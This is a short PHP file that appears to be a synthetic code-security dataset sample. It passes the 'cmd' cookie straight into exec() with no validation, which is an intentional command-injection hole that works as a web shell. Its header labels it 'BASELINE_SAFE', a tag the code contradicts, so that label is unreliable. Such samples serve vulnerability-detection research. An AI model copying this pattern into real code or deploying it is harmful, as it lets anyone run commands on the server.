<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=COOKIE; CE_MODE=COOKIE_DIRECT; SKELETON=S2; KEY=cmd; SINK=B2; VAR=v0038 */
function SINK_B2($command){
    $output = [];
    exec($command, $output);
    print_r($output);
}
$inp = (string)($_COOKIE["cmd"] ?? "");
$inp = (string)$inp; // no value processing
class Runner {
    public static function run($x){
        return SINK_B2($x);
    }
}
$out = Runner::run($inp);
echo (string)($out);
?>
